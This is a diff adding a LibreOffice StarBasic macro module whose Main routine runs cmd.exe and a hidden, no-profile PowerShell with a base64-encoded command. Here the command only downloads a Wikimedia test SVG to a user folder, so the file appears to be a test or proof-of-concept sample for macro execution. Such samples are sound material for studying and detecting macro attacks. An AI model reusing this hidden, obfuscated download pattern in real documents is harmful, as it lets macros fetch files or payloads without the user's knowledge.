@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****
+
+Sub Main
+Shell(&quot;cmd.exe /MIN /C &quot;,0,&quot;powershell.exe -nop -w hidden -encodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AdQBwAGwAbwBhAGQALgB3AGkAawBpAG0AZQBkAGkAYQAuAG8AcgBnAC8AdwBpAGsAaQBwAGUAZABpAGEALwBjAG8AbQBtAG8AbgBzAC8AYgAvAGIAZAAvAFQAZQBzAHQALgBzAHYAZwAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABVAHMAZQByAHMAXABsAHUAYwBhAHMAXABhAHIAYwBoAGkAdgBlAC4AcwB2AGcAIgA=&quot;,&quot;&quot;)
+End Sub
+
+</script:module>
